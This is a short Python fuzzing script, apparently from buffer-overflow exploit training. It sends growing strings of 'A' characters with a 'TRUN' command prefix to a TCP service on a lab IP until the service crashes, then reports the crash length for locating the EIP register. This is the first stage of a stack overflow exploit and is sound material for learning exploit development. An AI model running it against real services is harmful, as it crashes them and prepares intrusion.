#!/bin/python3


import socket
import time


ip = "10.0.2.15"  # Target IP - CHANGE
port = 9999       # Target Port - CHANGE

prefix = "TRUN /.:/"   # Prefix - CHANGE

count = 100

while True:
    try:
        fuzz = "A" * count
        payload = prefix + fuzz
    
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((ip, port))
            print("\r[*] Trying {} bytes.".format(count), end="")
            s.send(payload.encode("latin-1"))
            s.recv(1024)
        count += 100
        time.sleep(1)
    except:
        print("")
        break

print(f"[+] Crash between {count - 100} and {count} bytes.")
print(f"[+] Use {count} characters to locate EIP.")

